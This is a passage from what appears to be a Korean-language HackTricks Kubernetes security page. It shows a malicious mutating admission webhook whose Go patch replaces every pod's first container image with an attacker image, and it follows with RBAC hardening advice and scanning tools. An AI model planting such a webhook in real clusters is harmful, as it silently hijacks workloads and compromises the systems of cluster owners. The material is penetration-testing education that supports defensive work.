`ErrImagePull` 오류가 발생할 때는 다음 쿼리 중 하나를 사용하여 이미지 이름을 확인하세요:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

위의 이미지에서 볼 수 있듯이, 우리는 `nginx` 이미지를 실행하려고 시도했지만 최종 실행된 이미지는 `rewanthtammana/malicious-image`입니다. 어떻게 된 일인가요!?

#### 기술적인 내용 <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` 스크립트는 변형 웹훅 어드미션 컨트롤러를 설정합니다. 이 컨트롤러는 구성 라인에 지정된대로 Kubernetes API에 대한 요청을 수정하여 관찰된 결과에 영향을 줍니다:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
위의 코드 조각은 모든 파드의 첫 번째 컨테이너 이미지를 `rewanthtammana/malicious-image`로 대체합니다.

## 모범 사례

### **서비스 계정 토큰의 자동 마운트 비활성화**

- **파드 및 서비스 계정**: 기본적으로 파드는 서비스 계정 토큰을 마운트합니다. Kubernetes는 이 자동 마운트 기능을 비활성화할 수 있도록 허용합니다.
- **적용 방법**: Kubernetes 버전 1.6부터 서비스 계정 또는 파드의 구성에서 `automountServiceAccountToken: false`로 설정합니다.

### **RoleBindings/ClusterRoleBindings에서 제한적인 사용자 할당**

- **선택적 포함**: RoleBindings 또는 ClusterRoleBindings에 필요한 사용자만 포함되도록 합니다. 보안을 강화하기 위해 관련 없는 사용자를 정기적으로 감사하고 제거합니다.

### **네임스페이스별 역할 대 클러스터 전체 역할**

- **Roles vs. ClusterRoles**: 클러스터 전체에 적용되는 ClusterRoles 및 ClusterRoleBindings보다는 네임스페이스별 권한에 Roles 및 RoleBindings을 사용하는 것이 좋습니다. 이 접근 방식은 더 세밀한 제어와 권한의 범위 제한을 제공합니다.

### **자동화된 도구 사용**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **참고 자료**

* **[https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)**
* **[https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)**
* **[https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)**


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**을** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 **PR을 제출**하여 여러분의 해킹 기술을 공유하세요.

</details>
